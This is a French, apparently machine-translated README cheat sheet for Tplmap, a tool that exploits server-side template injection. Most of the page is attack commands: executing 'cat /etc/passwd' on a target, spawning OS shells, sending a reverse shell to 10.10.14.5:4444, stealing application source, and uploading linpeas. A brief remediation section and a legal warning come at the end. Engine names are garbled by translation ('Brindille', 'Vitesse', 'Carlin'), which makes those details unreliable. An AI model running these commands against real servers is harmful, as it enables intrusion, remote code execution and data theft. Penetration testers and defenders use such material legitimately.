<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<p align="center">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Sécurité Web et API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Moteurs de modèles">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licence GPLv2">
</p>

<p align="center">
  <b>🌐 Outil d'exploitation automatisé conçu pour détecter et exploiter les vulnérabilités SSTI (Server-Side Template Injection) afin de réaliser l'exécution de code à distance</b>
</p>

---

## 📋 Table des matières

- [Présentation et vulnérabilité SSTI](#-overview--the-ssti-vulnerability)
- [Moteurs de modèles pris en charge](#-supported-template-engines)
- [Installation](#-installation)
- [Détection de vulnérabilité de base](#-basic-vulnerability-detection)
-[Ciblage de points d'injection spécifiques (marqueur `*`)](#-targeting-special-injection-points--marker)
- [Exécution de commande à distance (`--os-cmd`)](#-remote-command-execution---os-cmd)
-[Coquilles interactives et connexions inversées](#-interactive-shells--reverse-connections)
- [Téléchargement et téléchargement de fichiers](#-file-upload--download)
- [Test des données et des en-têtes POST](#-testing-post-data--headers)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et mesures correctives](#-considérations-défensives--remédiation)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et vulnérabilité SSTI

L'**injection de modèle côté serveur (SSTI)** se produit lorsqu'une application intègre une entrée utilisateur non validée directement dans un modèle côté serveur plutôt que de la transmettre sous forme de données à restituer. Étant donné que les moteurs de modèles modernes autorisent une syntaxe telle que `{{7*7}}` ou `${7*7}`, les attaquants peuvent sortir du bac à sable et accéder à l'environnement d'exécution sous-jacent (Python, Java, PHP, Ruby, Node.js).

Écrit par **Miroslav Stampar** et **Emilio Pinna**, **Tplmap** fait office de « SQLMap pour les moteurs de modèles ». Il prend automatiquement en compte le moteur de modèle actif, sort des contextes d'évaluation de modèle et élève l'exécution du code vers un accès complet au shell au niveau du système d'exploitation.

---

## 🧩 Moteurs de modèles pris en charge

| Langue | Moteurs de modèles pris en charge |
|--------------|----------------------------|
| **Python** | Jinja2, Mako, Tornade, Nunjucks |
| **PHP** | Brindille, Smarty |
| **Java** | Freemarker, Vitesse |
| **Rubis** | ERB, mince |
| **Node.js** | Jade, Carlin, Dust.js |

---

## 📥Installation

Tplmap est construit sur Python :
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 Détection de vulnérabilité de base
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 Exécution de commandes à distance (`--os-cmd`)

Une fois que Tplmap détecte le moteur (par exemple, Jinja2), exécutez directement des commandes shell arbitraires :
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 Coquilles interactives et connexions inversées
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 Téléchargement et téléchargement de fichiers

Exfiltrez le code source ou téléchargez des outils de persistance :
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 Test des données et des en-têtes POST
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Détecter SSTI dans l'URL** | `python tplmap.py -u "<URL>?param=*"` |
| **Exécuter la commande à distance** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **Terminal interactif** | `python tplmap.py -u "<URL>" --os-shell` |
| **Lâchez la coque inversée** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Télécharger le fichier distant** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **Télécharger un fichier local** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **Tester le corps POST** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ Considérations défensives et mesures correctives

1. **Échappement contextuel :** Ne concaténez jamais les entrées brutes de l'utilisateur dans des chaînes de modèles. Utilisez le mécanisme de liaison de variables natif du moteur de modèle (par exemple, dans Jinja2 : `render_template('hello.html', name=user_input)` plutôt que `render_template_string(f"Hello {user_input}")`).
2. **Restrictions du sandbox :** Appliquez un sandboxing strict dans les moteurs où le rendu dynamique est inévitable, en interdisant l'accès aux objets `__class__`, `__mro__` ou de réflexion.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Tplmap exécute du code distant arbitraire sur les serveurs d'applications cibles. Tester ou exploiter des applications Web sans autorisation écrite préalable est strictement illégal.